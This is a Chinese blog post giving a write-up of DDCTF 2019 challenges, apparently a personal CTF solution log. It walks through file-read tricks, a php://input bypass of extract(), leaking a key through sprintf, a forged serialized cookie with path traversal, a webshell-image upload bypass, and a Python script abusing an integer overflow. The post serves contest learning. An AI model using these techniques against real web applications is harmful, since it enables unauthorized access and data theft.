<!DOCTYPE html>



  


<script type="text/javascript" color="122,122,255" opacity="0.5" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>



<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="又是一次被虐到自闭的比赛XD web滴~首先查看题目给的地址  http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09  这里jpg的格式很可疑，看起来像base64编码，我们进行两次base63解码，然后进行hex解码。得到了原本的文件名字flag.jpg然后我们尝试读取index.php解码后得到index.ph">
<meta property="og:type" content="article">
<meta property="og:title" content="2019DDctfWP">
<meta property="og:url" content="http://yoursite.com/2019/04/18/2019DDctfWP/index.html">
<meta property="og:site_name" content="Bling_Dog">
<meta property="og:description" content="又是一次被虐到自闭的比赛XD web滴~首先查看题目给的地址  http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09  这里jpg的格式很可疑，看起来像base64编码，我们进行两次base63解码，然后进行hex解码。得到了原本的文件名字flag.jpg然后我们尝试读取index.php解码后得到index.ph">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-c8c7d5e5393ad825.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-2d112680382a4f31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-2fee3ba8fc36ddd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-4192b114954629dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-1c3004450071539d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-ef0f18b96064417e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-7389c495ee22b85f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-73fa92d3082e0c02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-2a5a5ff26feb3465.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-c5c88ba2b0c25d14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-501186b87301584e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-dd3cdaee4905adfa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-dcaae8f02c3eb51f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-da2ba5de149268e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-0079b03f6ddb987f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-1c6ece86a19aaa0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-e86818f90b2eef44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-ba94ffefc9522d3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-657f16be5b47e043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-ed9783d4d57b7b28.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9eed02043e89b27a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-666745dd1d7f0aff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-f25214ae8963f480.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-0899e364204c5eca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-247168ff7a9e2445.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-d4cd6fd0ea82bb11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-5c6139f7f56fa01b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-6fe41c981485c615.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-2f44b61619728795.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:updated_time" content="2019-05-12T15:16:13.632Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019DDctfWP">
<meta name="twitter:description" content="又是一次被虐到自闭的比赛XD web滴~首先查看题目给的地址  http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09  这里jpg的格式很可疑，看起来像base64编码，我们进行两次base63解码，然后进行hex解码。得到了原本的文件名字flag.jpg然后我们尝试读取index.php解码后得到index.ph">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11234137-c8c7d5e5393ad825.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/04/18/2019DDctfWP/">





  <title>2019DDctfWP | Bling_Dog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Bling_Dog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">奔向大佬路上的小白</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            分类
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/18/2019DDctfWP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Bling_Dog">
      <meta itemprop="description" content>
      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bling_Dog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">2019DDctfWP</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-18T21:47:21+08:00">
                2019-04-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>又是一次被虐到自闭的比赛XD</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p>首先查看题目给的地址</p>
<blockquote>
<p><a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09" target="_blank" rel="noopener">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a></p>
</blockquote>
<p>这里jpg的格式很可疑，看起来像base64编码，我们进行两次base63解码，然后进行hex解码。得到了原本的文件名字flag.jpg<br><img src="https://upload-images.jianshu.io/upload_images/11234137-c8c7d5e5393ad825.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-c8c7d5e5393ad825.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后我们尝试读取index.php<br><img src="https://upload-images.jianshu.io/upload_images/11234137-2d112680382a4f31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-2d112680382a4f31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>解码后得到index.php的内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"> */</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">if(! isset($_GET[&apos;jpg&apos;]))</span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));</span><br><span class="line">echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后没有思路了，查看之前的一些文章，发现一个类似的题目，vim以尝退出会出现practice.txt.swp。我们构造出来这个文件之后，访问它<br><img src="https://upload-images.jianshu.io/upload_images/11234137-2fee3ba8fc36ddd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-2fee3ba8fc36ddd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>我们把这段base64解码，得到一个文件名f1ag!ddctf.php，很明显了，我们需要构造文件名字，然后读到内容。<br>根据index.php中的提示，字符串config能被转化成!,我们就可以构造f1agconfigddctf.php,然后编码，访问，得到flag。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-4192b114954629dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-4192b114954629dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>解码得到源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line">$k = &apos;hello&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    if($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo&apos;hello&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>根据代码意思，直接设置uid，然后k用php://input协议，post和uid相同的值，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-1c3004450071539d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-1c3004450071539d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>访问题目地址后，显示没有登陆权限，先查看一波源码<br><img src="https://upload-images.jianshu.io/upload_images/11234137-ef0f18b96064417e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-ef0f18b96064417e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>看到一个index.js，源码如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function auth() &#123;</span><br><span class="line">   $.ajax(&#123;</span><br><span class="line">       type: &quot;post&quot;,</span><br><span class="line">       url:&quot;http://117.51.158.44/app/Auth.php&quot;,</span><br><span class="line">       contentType: &quot;application/json;charset=utf-8&quot;,</span><br><span class="line">       dataType: &quot;json&quot;,</span><br><span class="line">       beforeSend: function (XMLHttpRequest) &#123;</span><br><span class="line">           XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;);</span><br><span class="line">       &#125;,</span><br><span class="line">       success: function (getdata) &#123;</span><br><span class="line">          console.log(getdata);</span><br><span class="line">          if(getdata.data !== &apos;&apos;) &#123;</span><br><span class="line">              document.getElementById(&apos;auth&apos;).innerHTML = getdata.data;</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;,error:function(error)&#123;</span><br><span class="line">           console.log(error);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显，我们需要post到这个网址，didictf_username为admin<br><img src="https://upload-images.jianshu.io/upload_images/11234137-7389c495ee22b85f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-7389c495ee22b85f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>访问app/fL2XID2i0Cdh.php，有两个php文件。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-73fa92d3082e0c02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-73fa92d3082e0c02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-2a5a5ff26feb3465.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-2a5a5ff26feb3465.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-c5c88ba2b0c25d14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-c5c88ba2b0c25d14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>题目意思很明显，我们需要读取key来构造session，然后通过反序列化，和魔法函数来读取flag的内容。那么如何读取key呢。我们看到这样一段代码</p>
<blockquote>
<p>if(!empty($_POST[“nickname”])) {<br>$arr = array($_POST[“nickname”],$this-&gt;eancrykey);<br>$data = “Welcome my friend %s”;<br>foreach ($arr as $k =&gt; $v) {<br>$data = sprintf($data,$v);<br>}<br>parent::response($data,”Welcome”);<br>}</p>
</blockquote>
<p>由于sprintf只能用一次，所以我们可以post这个nickname为%s，这个我们就可以让eancrykey也输出出来。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-501186b87301584e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-501186b87301584e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后根据得到的key进行反序列化，构造我们想要的内容。payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class Application &#123;</span><br><span class="line">    var $path = &apos;..././config/flag.txt&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$key=&quot;EzblrbNS&quot;;</span><br><span class="line">$ss=new Application;</span><br><span class="line">echo(serialize($ss));</span><br><span class="line">echo(md5($key.serialize($ss)).&quot;&lt;/br&gt;&quot;);</span><br></pre></td></tr></table></figure></p>
<p>我们将得到的东西放到cookie里面再访问这个网址，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-dd3cdaee4905adfa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-dd3cdaee4905adfa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>这个题考到了一些很好的考点，可以看freebuf的一个文章<br><a href="https://www.freebuf.com/articles/web/54086.html" target="_blank" rel="noopener">挖洞姿势：特殊的上传技巧，绕过PHP图片转换实现远程代码执行（RCE）</a>和一篇CSDN的文章<a href="https://blog.csdn.net/meinaozi/article/details/79417092" target="_blank" rel="noopener">绕过GD库渲染的WEBSHELL生成器</a><br>根据文章中的内容，我们首先找一张图片，上传到网站上，然后保存网站给我们传回来的图片(已经经过网站后台渲染)，然后运行文章中给的payload代码<br><img src="https://upload-images.jianshu.io/upload_images/11234137-dcaae8f02c3eb51f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-dcaae8f02c3eb51f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后我们上传这个图片，即可得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-da2ba5de149268e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-da2ba5de149268e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h2><p>首先进去之后，是一个注册界面，注册进去我们能看到，需要进行支付买票<br><img src="https://upload-images.jianshu.io/upload_images/11234137-0079b03f6ddb987f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-0079b03f6ddb987f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>我们通过抓包，可以看到参数是我们可以改动的。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-1c6ece86a19aaa0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-1c6ece86a19aaa0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>一般这样的题目，我们可以先试一下整数溢出。我们把值设置成0xffffffff+1的十进制，即4294967296，然后再Go一下，我们既可以看到，我们的支付界面的值变成了4294967296。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-e86818f90b2eef44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-e86818f90b2eef44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-ba94ffefc9522d3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-ba94ffefc9522d3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>支付成功后，我们就可以进入游戏<br><img src="https://upload-images.jianshu.io/upload_images/11234137-657f16be5b47e043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-657f16be5b47e043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>这里我们可以看到，每个人都有一个id和对应的ticket。我们移除对手需要对手的id和ticket，这里我没找到根据id生成ticket的方法，所以我采用了比较笨的方法，通过python脚本生成1000个用户，每个用户都购买游戏，根据概率的话，1000个用户，应该会出现100个不同的id，所以我们只要挨个删除id和ticket就可以了，最终能够吃鸡2333<br><img src alt><br>脚本如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">def reg():</span><br><span class="line">  	 for i in range(0,1000):</span><br><span class="line">  	       url = &quot;http://117.51.147.155:5050/ctf/api/register?name=cxc&quot;+str(i)+&quot;&amp;password=12345678&quot;</span><br><span class="line">    	   html = requests.get(url)</span><br><span class="line">     	   print(html.text)</span><br><span class="line">def get_ticket(i):</span><br><span class="line">       s = requests.session()</span><br><span class="line">       s.get(&quot;http://117.51.147.155:5050/ctf/api/login?name=cxc&quot;+str(i)+&quot;&amp;password=12345678&quot;)</span><br><span class="line">       html = s.get(&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;)</span><br><span class="line">       json1 = json.loads(html.text)</span><br><span class="line">       ticketid = json1[&quot;data&quot;][0][&quot;bill_id&quot;]</span><br><span class="line">       html1 = s.get(&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;+ticketid)</span><br><span class="line">       html2 = s.get(&quot;http://117.51.147.155:5050/ctf/api/search_ticket&quot;)</span><br><span class="line">       json2 = json.loads(html2.text)</span><br><span class="line">       id = json2[&quot;data&quot;][0][&quot;id&quot;]</span><br><span class="line">       ticket = json2[&quot;data&quot;][0][&quot;ticket&quot;]</span><br><span class="line">       pack = &#123;&quot;id&quot;:id , &quot;ticket&quot;:ticket&#125;</span><br><span class="line">       return pack</span><br><span class="line">def del_people(id,ticket):</span><br><span class="line">	   s = requests.session()</span><br><span class="line">      s.get(&quot;http://117.51.147.155:5050/ctf/api/login?name=cxc&amp;password=12345678&quot;)</span><br><span class="line"> 	   html = s.get(&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=&quot;+str(id)+&quot;&amp;ticket=&quot;+ticket)</span><br><span class="line">  	   print(html.text)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"> 	  reg()</span><br><span class="line">     for i in range(0,1000):</span><br><span class="line">      	 	pack = get_ticket(i)</span><br><span class="line">     	    id = pack[&quot;id&quot;]</span><br><span class="line">      	 	ticket = pack[&quot;ticket&quot;]</span><br><span class="line">      	 	print(id)</span><br><span class="line">      	 	print(ticket)</span><br><span class="line">       	del_people(id, ticket)</span><br><span class="line">       	#del_people(id,ticket)</span><br></pre></td></tr></table></figure>
<p>最终删除所有的id后，得到flag。脚本大约得跑三四十分钟<br><img src="https://upload-images.jianshu.io/upload_images/11234137-ed9783d4d57b7b28.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-ed9783d4d57b7b28.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>#MISC</p>
<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><p>这个题很简单，xortools直接跑出flag，工具获得的地址为<a href="https://github.com/hellman/xortool" target="_blank" rel="noopener">https://github.com/hellman/xortool</a></p>
